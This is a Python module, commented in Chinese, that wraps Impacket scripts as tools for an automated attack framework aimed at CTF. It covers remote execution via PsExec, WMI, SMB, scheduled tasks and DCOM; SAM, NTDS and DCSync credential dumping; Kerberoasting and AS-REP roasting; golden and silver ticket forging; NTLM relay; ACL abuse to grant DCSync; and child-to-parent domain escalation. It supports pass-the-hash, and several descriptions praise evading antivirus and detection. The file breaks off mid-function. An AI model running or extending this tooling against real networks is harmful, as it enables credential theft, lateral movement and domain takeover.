# tools/impacket_tools.py
"""
Impacket 工具集完整实现

分类:
1. 远程执行类: psexec, wmiexec, smbexec, atexec, dcomexec
2. 凭据导出类: secretsdump
3. Kerberos攻击: GetNPUsers, GetUserSPNs, goldenPac, ticketer
4. NTLM中继: ntlmrelayx
5. AD域渗透: dacledit, getADUsers, raiseChild
6. SMB工具: smbclient, smbserver, lookupsid
7. MSSQL工具: mssqlclient, mssqlinstance
8. RPC工具: rpcdump, samrdump
9. 其他工具: reg, services, getArch

CTF场景优化:
- 自动化凭据利用
- 支持Pass-the-Hash
- 支持Kerberos认证
"""
import os
import re
import shutil
import subprocess
from typing import Dict, Any, Optional, List
from tool_framework import CommandLineTool


# ==================== 基类 ====================

class ImpacketTool(CommandLineTool):
    """Impacket 工具基类"""

    # 常见安装路径
    COMMON_PATHS = [
        "/root/.local/bin/{name}",      # pipx 安装 (小写)
        "/root/.local/bin/{name}.py",   # pipx 安装 (.py后缀)
        "/root/.local/bin/{name_caps}", # pipx 安装 (首字母大写)
        "/root/.local/bin/{name_caps}.py",
        "/usr/local/bin/{name}",        # 全局安装
        "/usr/local/bin/{name}.py",
        "/opt/venv/bin/{name}",         # venv 安装
        "/opt/venv/bin/{name}.py",
        "/opt/impacket/examples/{name}.py",
        "/opt/impacket/examples/{name_caps}.py",
        "/usr/share/impacket/{name}.py",
        "/usr/share/doc/python3-impacket/examples/{name}.py",
    ]

    def __init__(self, tool_name: str):
        self.tool_name = tool_name
        self.cmd_path = "python3"
        self.script_path = self._find_script(tool_name)
        self.use_direct = self.script_path is None and shutil.which(tool_name) is not None

        if self.use_direct:
            self.cmd_path = tool_name

        super().__init__(self.cmd_path)
        self.timeout = 120

    def _find_script(self, name: str) -> Optional[str]:
        """查找脚本路径"""
        # 特殊工具名称映射
        special_names = {
            'getadusers': 'GetADUsers',
            'getnpusers': 'GetNPUsers',
            'getuserspns': 'GetUserSPNs',
            'goldenpac': 'goldenPac',
            'raisechild': 'raiseChild',
            'dacledit': 'dacledit',
            'ntlmrelayx': 'ntlmrelayx',
            'getarch': 'getArch',
        }

        # 获取规范名称
        canonical_name = special_names.get(name.lower(), name)

        # 尝试不同的名称格式
        name_variants = [
            name,
            name.lower(),
            canonical_name,
            canonical_name.lower(),
        ]

        # 去重
        name_variants = list(dict.fromkeys(name_variants))

        for path_template in self.COMMON_PATHS:
            for variant in name_variants:
                if '{name_caps}' in path_template:
                    path = path_template.format(name=variant.lower(), name_caps=variant)
                else:
                    path = path_template.format(name=variant)
                if os.path.exists(path):
                    return path

        # 最后直接检查 .py 文件
        for variant in name_variants:
            for base in ['/root/.local/bin', '/opt/venv/bin']:
                py_path = f"{base}/{variant}.py"
                if os.path.exists(py_path):
                    return py_path

        return None

    def check_available(self) -> bool:
        return self.script_path is not None or shutil.which(self.tool_name) is not None

    def _build_cmd(self) -> List[str]:
        """构建基础命令"""
        if self.use_direct:
            return [self.tool_name]
        elif self.script_path:
            return [self.cmd_path, self.script_path]
        else:
            return [self.tool_name]

    def _run_cmd(self, args: List[str], timeout: int = None) -> Dict:
        """执行命令并返回结果"""
        cmd = self._build_cmd() + args
        try:
            result = self._run_command(cmd, timeout=timeout or self.timeout, stream_output=True)
            return {
                "success": result.get("returncode", 0) == 0,
                "output": result.get("stdout", ""),
                "error": result.get("stderr", "")
            }
        except Exception as e:
            return {"success": False, "output": "", "error": str(e)}


# ==================== 远程执行类 ====================

class PsexecTool(ImpacketTool):
    """psexec.py - PsExec远程执行"""

    def __init__(self):
        super().__init__("psexec")

    def name(self) -> str:
        return "psexec"

    def description(self) -> str:
        return "Impacket psexec - 通过PsExec远程执行命令，需要管理员权限"

    def supported_vulns(self) -> list:
        return ["Remote Execution", "PsExec", "Lateral Movement", "Pass-the-Hash"]

    def capability_statement(self) -> str:
        return "Windows远程执行工具。适合：已获取管理员凭据后的横向移动。特点：创建服务执行命令，可能被杀软检测。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP或主机名", "required": True},
            "username": {"type": "str", "description": "用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希 (LMHASH:NTHASH)", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "command": {"type": "str", "description": "要执行的命令", "required": True},
            "service_name": {"type": "str", "description": "服务名（可选）", "required": False}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "psexec.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        hash_val = params.get("hash", "")
        command = params.get("command", "whoami")
        service_name = params.get("service_name")

        auth = f"{domain}/{username}" if domain else username
        if hash_val:
            args.extend(["-hashes", hash_val])
        args.append(f"{auth}@{target}")
        args.append(command)
        if service_name:
            args.extend(["-service-name", service_name])

        return self._run_cmd(args)


class WmiexecTool(ImpacketTool):
    """wmiexec.py - WMI远程执行"""

    def __init__(self):
        super().__init__("wmiexec")

    def name(self) -> str:
        return "wmiexec"

    def description(self) -> str:
        return "Impacket wmiexec - 通过WMI远程执行命令，更隐蔽但较慢"

    def supported_vulns(self) -> list:
        return ["Remote Execution", "WMI Execution", "Lateral Movement"]

    def capability_statement(self) -> str:
        return "WMI远程执行工具。适合：隐蔽执行命令，不易被杀软检测。特点：不需要管理员权限即可执行，但需要WMI服务可用。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "command": {"type": "str", "description": "要执行的命令", "required": True},
            "shell_type": {"type": "str", "description": "Shell类型: cmd,powershell", "required": False, "default": "cmd"}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "wmiexec.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        hash_val = params.get("hash", "")
        command = params.get("command", "whoami")
        shell_type = params.get("shell_type", "cmd")

        auth = f"{domain}/{username}" if domain else username
        if hash_val:
            args.extend(["-hashes", hash_val])
        if shell_type == "powershell":
            args.append("-shell-type")
            args.append("powershell")
        args.append(f"{auth}@{target}")
        args.append(command)

        return self._run_cmd(args)


class SmbexecTool(ImpacketTool):
    """smbexec.py - SMB远程执行"""

    def __init__(self):
        super().__init__("smbexec")

    def name(self) -> str:
        return "smbexec"

    def description(self) -> str:
        return "Impacket smbexec - 通过SMB远程执行命令，使用批处理文件"

    def supported_vulns(self) -> list:
        return ["Remote Execution", "SMB Execution", "Lateral Movement"]

    def capability_statement(self) -> str:
        return "SMB远程执行工具。适合：不需要PsExec的场景。特点：通过SMB共享执行，需要写入权限。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "share": {"type": "str", "description": "共享名 (C$,ADMIN$)", "required": False, "default": "C$"}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "smbexec.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        hash_val = params.get("hash", "")
        share = params.get("share", "C$")

        auth = f"{domain}/{username}" if domain else username
        if hash_val:
            args.extend(["-hashes", hash_val])
        args.extend(["-share", share])
        args.append(f"{auth}@{target}")

        return self._run_cmd(args)


class AtexecTool(ImpacketTool):
    """atexec.py - 计划任务执行"""

    def __init__(self):
        super().__init__("atexec")

    def name(self) -> str:
        return "atexec"

    def description(self) -> str:
        return "Impacket atexec - 通过计划任务远程执行命令"

    def supported_vulns(self) -> list:
        return ["Remote Execution", "Scheduled Task", "Lateral Movement"]

    def capability_statement(self) -> str:
        return "计划任务远程执行工具。适合：一次性命令执行。特点：创建临时计划任务，执行后自动删除。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "command": {"type": "str", "description": "要执行的命令", "required": True}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "atexec.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        hash_val = params.get("hash", "")
        command = params.get("command", "whoami")

        auth = f"{domain}/{username}" if domain else username
        if hash_val:
            args.extend(["-hashes", hash_val])
        args.append(f"{auth}@{target}")
        args.append(command)

        return self._run_cmd(args)


class DcomexecTool(ImpacketTool):
    """dcomexec.py - DCOM远程执行"""

    def __init__(self):
        super().__init__("dcomexec")

    def name(self) -> str:
        return "dcomexec"

    def description(self) -> str:
        return "Impacket dcomexec - 通过DCOM远程执行命令，多种方式可选"

    def supported_vulns(self) -> list:
        return ["Remote Execution", "DCOM Execution", "Lateral Movement"]

    def capability_statement(self) -> str:
        return "DCOM远程执行工具。适合：绕过PsExec检测。特点：支持MMC20,ShellWindows,ShellBrowserWindow等多种方式。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "command": {"type": "str", "description": "要执行的命令", "required": True},
            "object": {"type": "str", "description": "DCOM对象: MMC20,ShellWindows,ShellBrowserWindow", "required": False, "default": "MMC20"}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "dcomexec.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        hash_val = params.get("hash", "")
        command = params.get("command", "whoami")
        dcom_object = params.get("object", "MMC20")

        auth = f"{domain}/{username}" if domain else username
        if hash_val:
            args.extend(["-hashes", hash_val])
        args.extend(["-object", dcom_object])
        args.append(f"{auth}@{target}")
        args.append(command)

        return self._run_cmd(args)


# ==================== 凭据导出类 ====================

class SecretsDumpTool(ImpacketTool):
    """secretsdump.py - 凭据导出工具"""

    def __init__(self):
        super().__init__("secretsdump")

    def name(self) -> str:
        return "secretsdump"

    def description(self) -> str:
        return "Impacket secretsdump - 导出Windows凭据(SAM/LSASS/NTDS)"

    def supported_vulns(self) -> list:
        return ["Credential Dumping", "SAM Dump", "NTDS Extraction", "LSASS Dump", "DCSync"]

    def capability_statement(self) -> str:
        return "凭据导出工具。适合：获取本地SAM哈希、域NTDS.dit凭据、LSASS内存转储。支持远程和本地模式。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标 (user:pass@host 或 LOCAL)", "required": True},
            "username": {"type": "str", "description": "用户名", "required": False},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "local": {"type": "bool", "description": "本地SAM转储模式", "required": False, "default": False},
            "ntds": {"type": "bool", "description": "NTDS.dit转储", "required": False, "default": False},
            "outputfile": {"type": "str", "description": "输出文件路径", "required": False}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "secretsdump.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        local_mode = params.get("local", False)
        ntds_mode = params.get("ntds", False)
        outputfile = params.get("outputfile")

        if local_mode:
            # 本地模式
            args.append("LOCAL")
            if outputfile:
                args.extend(["-outputfile", outputfile])
        else:
            # 远程模式
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                args.extend(["-hashes", hash_val])
            elif password:
                auth += f":{password}"
            args.append(auth)
            args.append(f"@{target}")

            if ntds_mode:
                args.append("-just-dc")

            if outputfile:
                args.extend(["-outputfile", outputfile])

        result = self._run_cmd(args, timeout=300)
        output = result.get("output", "")

        # 解析凭据
        credentials = []
        for line in output.split("\n"):
            if "::" in line:
                parts = line.split(":")
                if len(parts) >= 4:
                    credentials.append({
                        "username": parts[0].strip(),
                        "rid": parts[1].strip() if len(parts) > 1 else "",
                        "lm_hash": parts[2].strip() if len(parts) > 2 else "",
                        "ntlm_hash": parts[3].strip() if len(parts) > 3 else ""
                    })

        result["credentials"] = credentials[:50]
        result["summary"] = f"导出 {len(credentials)} 条凭据"
        return result


# ==================== Kerberos攻击类 ====================

class GetNPUsersTool(ImpacketTool):
    """GetNPUsers.py - AS-REP Roasting攻击"""

    def __init__(self):
        super().__init__("GetNPUsers")

    def name(self) -> str:
        return "getnpusers"

    def description(self) -> str:
        return "Impacket GetNPUsers - AS-REP Roasting攻击，获取禁用预认证用户的Kerberos哈希"

    def supported_vulns(self) -> list:
        return ["AS-REP Roasting", "Kerberos Attack", "Pre-auth Disabled"]

    def capability_statement(self) -> str:
        return "AS-REP Roasting工具。适合：枚举禁用Kerberos预认证的用户，获取可离线破解的哈希。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "domain": {"type": "str", "description": "目标域名", "required": True},
            "dc_ip": {"type": "str", "description": "域控IP", "required": True},
            "users_file": {"type": "str", "description": "用户名列表文件", "required": False},
            "format": {"type": "str", "description": "输出格式: hashcat,john", "required": False, "default": "hashcat"}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "GetNPUsers.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        dc_ip = params.get("dc_ip", "")
        users_file = params.get("users_file", "")
        output_format = params.get("format", "hashcat")

        args.extend(["-dc-ip", dc_ip])
        args.append("-no-pass")
        args.append("-request")

        if output_format == "john":
            args.extend(["-format", "john"])

        if users_file:
            args.extend(["-users", users_file])

        args.append(domain + "/")

        result = self._run_cmd(args)
        output = result.get("output", "")

        # 解析哈希
        hashes = []
        for line in output.split("\n"):
            if "$krb5asrep$" in line:
                hashes.append(line.strip())

        result["hashes"] = hashes
        result["summary"] = f"发现 {len(hashes)} 个AS-REP哈希"
        return result


class GetUserSPNsTool(ImpacketTool):
    """GetUserSPNs.py - Kerberoasting攻击"""

    def __init__(self):
        super().__init__("GetUserSPNs")

    def name(self) -> str:
        return "getuserspns"

    def description(self) -> str:
        return "Impacket GetUserSPNs - Kerberoasting攻击，获取SPN用户的Kerberos哈希"

    def supported_vulns(self) -> list:
        return ["Kerberoasting", "Kerberos Attack", "SPN Enumeration"]

    def capability_statement(self) -> str:
        return "Kerberoasting工具。适合：枚举域内SPN账户，请求TGS并获取可离线破解的哈希。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "domain": {"type": "str", "description": "目标域名", "required": True},
            "username": {"type": "str", "description": "认证用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "dc_ip": {"type": "str", "description": "域控IP", "required": True},
            "request": {"type": "bool", "description": "请求TGS", "required": False, "default": True},
            "format": {"type": "str", "description": "输出格式: hashcat,john", "required": False, "default": "hashcat"}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "GetUserSPNs.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        dc_ip = params.get("dc_ip", "")
        output_format = params.get("format", "hashcat")
        request = params.get("request", True)

        auth = f"{domain}/{username}"
        if hash_val:
            args.extend(["-hashes", hash_val])
        elif password:
            auth += f":{password}"

        args.extend(["-dc-ip", dc_ip])

        if request:
            args.append("-request")

        if output_format == "john":
            args.extend(["-format", "john"])

        args.append(auth)

        result = self._run_cmd(args)
        output = result.get("output", "")

        # 解析哈希
        hashes = []
        for line in output.split("\n"):
            if "$krb5tgs$" in line:
                hashes.append(line.strip())

        result["hashes"] = hashes
        result["summary"] = f"发现 {len(hashes)} 个Kerberoasting哈希"
        return result


class TicketerTool(ImpacketTool):
    """ticketer.py - 创建黄金/白银票据"""

    def __init__(self):
        super().__init__("ticketer")

    def name(self) -> str:
        return "ticketer"

    def description(self) -> str:
        return "Impacket ticketer - 创建黄金票据(Golden Ticket)或白银票据(Silver Ticket)"

    def supported_vulns(self) -> list:
        return ["Golden Ticket", "Silver Ticket", "Kerberos Forgery", "Persistence"]

    def capability_statement(self) -> str:
        return "票据伪造工具。适合：利用krbtgt哈希创建黄金票据实现域内持久化，或创建白银票据访问特定服务。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "domain": {"type": "str", "description": "域名", "required": True},
            "domain_sid": {"type": "str", "description": "域SID", "required": True},
            "krbtgt_hash": {"type": "str", "description": "krbtgt NTLM哈希 (用于黄金票据)", "required": False},
            "service_key": {"type": "str", "description": "服务密钥 (用于白银票据)", "required": False},
            "service": {"type": "str", "description": "服务名 (白银票据)", "required": False},
            "target": {"type": "str", "description": "目标服务器 (白银票据)", "required": False},
            "user": {"type": "str", "description": "伪造的用户名", "required": False, "default": "Administrator"},
            "user_id": {"type": "int", "description": "用户RID", "required": False, "default": 500},
            "groups": {"type": "str", "description": "组RID列表", "required": False, "default": "513,512,520,518,519"}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "ticketer.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        domain_sid = params.get("domain_sid", "")
        krbtgt_hash = params.get("krbtgt_hash", "")
        service_key = params.get("service_key", "")
        service = params.get("service", "")
        target_host = params.get("target", "")
        user = params.get("user", "Administrator")
        user_id = params.get("user_id", 500)
        groups = params.get("groups", "513,512,520,518,519")

        args.extend(["-domain", domain])
        args.extend(["-domain-sid", domain_sid])
        args.extend(["-user-id", str(user_id)])
        args.extend(["-groups", groups])

        if krbtgt_hash:
            # 黄金票据
            args.extend(["-nthash", krbtgt_hash])
        elif service_key and service and target_host:
            # 白银票据
            args.extend(["-spn", f"{service}/{target_host}"])
            args.extend(["-nthash", service_key])

        args.append(user)

        result = self._run_cmd(args)
        output = result.get("output", "")

        # 检查票据文件
        ticket_file = f"{user}.ccache"
        if os.path.exists(ticket_file):
            result["ticket_file"] = ticket_file
            result["ticket_path"] = os.path.abspath(ticket_file)

        return result


class GoldenPacTool(ImpacketTool):
    """goldenPac.py - 黄金票据攻击"""

    def __init__(self):
        super().__init__("goldenPac")

    def name(self) -> str:
        return "goldenpac"

    def description(self) -> str:
        return "Impacket goldenPac - 黄金票据攻击，利用krbtgt哈希获取域管权限"

    def supported_vulns(self) -> list:
        return ["Golden Ticket", "Domain Persistence", "Kerberos Attack"]

    def capability_statement(self) -> str:
        return "黄金票据攻击工具。适合：获取krbtgt哈希后直接获取域控访问权限。特点：自动创建票据并执行命令。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标域控", "required": True},
            "domain": {"type": "str", "description": "域名", "required": True},
            "username": {"type": "str", "description": "伪造的用户名", "required": False, "default": "Administrator"},
            "domain_sid": {"type": "str", "description": "域SID", "required": True},
            "krbtgt_hash": {"type": "str", "description": "krbtgt NTLM哈希", "required": True},
            "command": {"type": "str", "description": "要执行的命令", "required": False}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "goldenPac.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "Administrator")
        domain_sid = params.get("domain_sid", "")
        krbtgt_hash = params.get("krbtgt_hash", "")
        command = params.get("command")

        args.extend(["-domain", domain])
        args.extend(["-domain-sid", domain_sid])
        args.extend(["-nthash", krbtgt_hash])
        args.extend(["-target-ip", target])

        if command:
            args.append("-command")
            args.append(command)

        args.append(f"{domain}/{username}@{target}")

        return self._run_cmd(args, timeout=180)


# ==================== NTLM中继类 ====================

class NtlmrelayxTool(ImpacketTool):
    """ntlmrelayx.py - NTLM中继攻击"""

    def __init__(self):
        super().__init__("ntlmrelayx")

    def name(self) -> str:
        return "ntlmrelayx"

    def description(self) -> str:
        return "Impacket ntlmrelayx - NTLM中继攻击，支持多协议"

    def supported_vulns(self) -> list:
        return ["NTLM Relay", "SMB Relay", "LDAP Relay", "AD CS Attack"]

    def capability_statement(self) -> str:
        return "NTLM中继工具。适合：捕获NTLM认证并中继到其他服务。支持SMB、LDAP、HTTP、MSSQL等协议，可攻击AD CS。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "targets": {"type": "str", "description": "目标列表文件或单个目标 (如 ldap://dc.ip)", "required": True},
            "smb_port": {"type": "int", "description": "SMB监听端口", "required": False, "default": 445},
            "http_port": {"type": "int", "description": "HTTP监听端口", "required": False, "default": 80},
            "socks": {"type": "bool", "description": "启用SOCKS代理", "required": False, "default": False},
            "adcs": {"type": "bool", "description": "AD CS模板攻击", "required": False, "default": False},
            "delegate": {"type": "bool", "description": "资源委派攻击", "required": False, "default": False}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "ntlmrelayx.py 未找到", "success": False}

        args = []
        targets = params.get("targets", target)
        socks = params.get("socks", False)
        adcs = params.get("adcs", False)
        delegate = params.get("delegate", False)

        # 目标
        if targets.startswith("ldap://") or targets.startswith("ldaps://"):
            args.extend(["-t", targets])
        else:
            args.extend(["-tf", targets])

        if socks:
            args.append("-socks")

        if adcs:
            args.extend(["-adcs"])

        if delegate:
            args.append("-delegate")

        # ntlmrelayx需要后台运行
        return {
            "success": True,
            "command": " ".join(self._build_cmd() + args),
            "notes": "此工具需要后台运行，建议使用 nohup 或 screen",
            "usage": f"后台执行: nohup {' '.join(self._build_cmd() + args)} &"
        }


# ==================== AD域渗透类 ====================

class DacleditTool(ImpacketTool):
    """dacledit.py - AD ACL编辑"""

    def __init__(self):
        super().__init__("dacledit")

    def name(self) -> str:
        return "dacledit"

    def description(self) -> str:
        return "Impacket dacledit - AD ACL编辑，可授予DCSync等权限"

    def supported_vulns(self) -> list:
        return ["ACL Abuse", "DCSync Attack", "AD Privilege Escalation"]

    def capability_statement(self) -> str:
        return "ACL编辑工具。适合：利用WriteDACL权限授予自己DCSync等高权限。常用于域提权链。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {"type": "str", "description": "操作: read,write,remove", "required": True},
            "target_dn": {"type": "str", "description": "目标DN", "required": True},
            "principal": {"type": "str", "description": "要授权的主体", "required": True},
            "rights": {"type": "str", "description": "权限类型: DCSync,WriteDACL,GenericAll", "required": True},
            "domain": {"type": "str", "description": "域名", "required": True},
            "username": {"type": "str", "description": "用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "dc_ip": {"type": "str", "description": "域控IP", "required": True}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "dacledit.py 未找到", "success": False}

        args = []
        action = params.get("action", "write")
        target_dn = params.get("target_dn", "")
        principal = params.get("principal", "")
        rights = params.get("rights", "DCSync")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        dc_ip = params.get("dc_ip", "")

        auth = f"{domain}/{username}"
        if hash_val:
            args.extend(["-hashes", hash_val])
        elif password:
            auth += f":{password}"

        args.extend([
            "-action", action,
            "-rights", rights,
            "-principal", principal,
            "-target-dn", target_dn,
            "-dc-ip", dc_ip,
            auth
        ])

        return self._run_cmd(args)


class GetADUsersTool(ImpacketTool):
    """getADUsers.py - 枚举域用户"""

    def __init__(self):
        super().__init__("getADUsers")

    def name(self) -> str:
        return "getadusers"

    def description(self) -> str:
        return "Impacket getADUsers - 枚举Active Directory域用户信息"

    def supported_vulns(self) -> list:
        return ["User Enumeration", "AD Reconnaissance", "Information Disclosure"]

    def capability_statement(self) -> str:
        return "域用户枚举工具。适合：无需域权限即可获取域用户列表，包括邮件、电话等信息。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "domain": {"type": "str", "description": "域名", "required": True},
            "dc_ip": {"type": "str", "description": "域控IP", "required": True},
            "username": {"type": "str", "description": "认证用户名", "required": False},
            "password": {"type": "str", "description": "密码", "required": False},
            "all": {"type": "bool", "description": "获取所有用户", "required": False, "default": True}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "getADUsers.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        dc_ip = params.get("dc_ip", "")
        username = params.get("username", "")
        password = params.get("password", "")

        args.extend(["-dc-ip", dc_ip])

        if username and password:
            auth = f"{domain}/{username}:{password}"
            args.append(auth)
        else:
            args.append("-all")
            args.append(domain + "/")

        result = self._run_cmd(args)
        output = result.get("output", "")

        # 解析用户
        users = []
        for line in output.split("\n"):
            if "Name:" in line:
                user = {"name": line.split("Name:")[1].strip()}
                users.append(user)

        result["users"] = users
        result["summary"] = f"发现 {len(users)} 个域用户"
        return result


class RaiseChildTool(ImpacketTool):
    """raiseChild.py - 子域到父域提权"""

    def __init__(self):
        super().__init__("raiseChild")

    def name(self) -> str:
        return "raisechild"

    def description(self) -> str:
        return "Impacket raiseChild - 从子域提权到父域，利用子域管理员权限获取父域控制权"

    def supported_vulns(self) -> list:
        return ["Child Domain Attack", "Domain Escalation", "Enterprise Admin"]

    def capability_statement(self) -> str:
        return "子域提权工具。适合：获取子域管理员后提权到父域。利用Enterprise Admin组的信任关系。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "child_domain": {"type": "str", "description": "子域名", "required": True},
            "username": {"type": "str", "description": "子域管理员用户名", "required": True},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "target_domain": {"type": "str", "description": "父域名 (可选)", "required": False}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "raiseChild.py 未找到", "success": False}

        args = []
        child_domain = params.get("child_domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        target_domain = params.get("target_domain", "")

        auth = f"{child_domain}/{username}"
        if hash_val:
            args.extend(["-hashes", hash_val])
        elif password:
            auth += f":{password}"

        args.append(auth)

        if target_domain:
            args.extend(["-target-domain", target_domain])

        return self._run_cmd(args, timeout=300)


# ==================== SMB工具类 ====================

class SmbclientTool(ImpacketTool):
    """smbclient.py - SMB客户端"""

    def __init__(self):
        super().__init__("smbclient")

    def name(self) -> str:
        return "smbclient"

    def description(self) -> str:
        return "Impacket smbclient - SMB客户端，用于访问SMB共享"

    def supported_vulns(self) -> list:
        return ["SMB Access", "Share Enumeration", "File Transfer"]

    def capability_statement(self) -> str:
        return "SMB客户端工具。适合：枚举共享、上传下载文件、执行SMB命令。支持匿名和凭据访问。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": False},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "share": {"type": "str", "description": "共享名", "required": False},
            "action": {"type": "str", "description": "操作: list,download,upload,delete", "required": False},
            "path": {"type": "str", "description": "文件路径", "required": False}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "smbclient.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        share = params.get("share", "")

        if username:
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                args.extend(["-hashes", hash_val])
            elif password:
                auth += f":{password}"
            args.append(auth)

        args.append(f"@{target}")

        if share:
            args.append(f"//{share}")

        return self._run_cmd(args)


class LookupsidTool(ImpacketTool):
    """lookupsid.py - SID枚举"""

    def __init__(self):
        super().__init__("lookupsid")

    def name(self) -> str:
        return "lookupsid"

    def description(self) -> str:
        return "Impacket lookupsid - 通过LSA枚举用户SID"

    def supported_vulns(self) -> list:
        return ["SID Enumeration", "User Enumeration", "Domain Reconnaissance"]

    def capability_statement(self) -> str:
        return "SID枚举工具。适合：通过暴力枚举获取域用户列表。可绕过某些用户枚举限制。"

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {"type": "str", "description": "目标IP", "required": True},
            "username": {"type": "str", "description": "用户名", "required": False},
            "password": {"type": "str", "description": "密码", "required": False},
            "hash": {"type": "str", "description": "NTLM哈希", "required": False},
            "domain": {"type": "str", "description": "域名", "required": False},
            "max_rid": {"type": "int", "description": "最大RID", "required": False, "default": 4000}
        }

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {"error": "lookupsid.py 未找到", "success": False}

        args = []
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hash_val = params.get("hash", "")
        max_rid = params.get("max_rid", 4000)

        if username:
            auth = f"{domain}/{username}" if domain else username
            if hash_val:
                args.extend(["-hashes", hash_val])
            elif password:
                auth += f":{password}"
            args.append(auth)

        args.append(f"@{target}")
        args.extend(["-max", str(max_rid)])

        result = self._run_cmd(args)
        output = result.get("output", "")

        # 解析用户
        users = []
        for line in output.split("\n"):
            if "S-1-5" in line and "\\" in line:
                parts = line.split("\\")
                if len(parts) >= 2:
                    user_info = parts[-1].strip()
                    if user_info:
                        users.append(user_info)

        result["users"] = list(set(users))
